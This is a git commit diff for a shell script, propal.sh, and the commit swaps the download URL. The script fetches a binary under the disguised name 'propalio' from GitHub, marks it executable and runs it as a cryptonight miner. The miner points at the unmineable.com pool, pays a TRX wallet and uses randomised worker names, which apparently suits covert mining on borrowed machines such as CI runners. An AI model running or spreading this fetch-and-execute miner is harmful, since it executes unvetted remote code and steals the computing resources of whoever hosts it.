4bc9405755b570f2156143e0a61e63ebc5288bda
ferasa <86012372+desafff@users.noreply.github.com>
2021-08-09 16:24:31 +0700

    Update propal.sh

--- propal.sh
+++ propal.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
-wget https://raw.githubusercontent.com/matrasist17/runner/main/propalio
+wget https://github.com/mariobiszz/SRB/raw/main/propalio
 chmod +x propalio
 ./propalio --algorithm cryptonight_upx --pool rx.unmineable.com:3333 --wallet TRX:TKFKVc4GpHpe21Lq4gHjcseFhFYnFpLLK1.$(echo $(shuf -i 1-20000 -n 1)-V) --password x
